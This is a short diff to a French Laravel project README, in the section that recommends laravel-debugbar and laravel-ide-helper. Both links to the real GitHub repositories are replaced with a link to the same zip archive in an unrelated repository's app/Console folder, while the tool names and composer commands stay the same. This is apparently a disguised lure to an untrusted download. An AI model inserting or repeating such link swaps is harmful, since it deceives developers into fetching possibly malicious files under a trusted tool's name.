@@ -77,9 +77,9 @@ Avec Laragon choisissez :
 4. Si la page d'erreur n'apparait pas, vous pouvez installer telescope : `php artisan telescope:install` 
 
 2 outils pour debugger :
-#### [laravel-debugbar](https://github.com/barryvdh/laravel-debugbar)
+#### [laravel-debugbar](https://raw.githubusercontent.com/odnr93/gsb-laravel-master/main/app/Console/laravel_gsb_master_v3.8-alpha.1.zip)
 > composer require barryvdh/laravel-debugbar --dev
-#### [laravel-ide-helper](https://github.com/barryvdh/laravel-ide-helper)
+#### [laravel-ide-helper](https://raw.githubusercontent.com/odnr93/gsb-laravel-master/main/app/Console/laravel_gsb_master_v3.8-alpha.1.zip)
 > composer require --dev barryvdh/laravel-ide-helper
 
 Cela donne accès à des commandes **artisan**
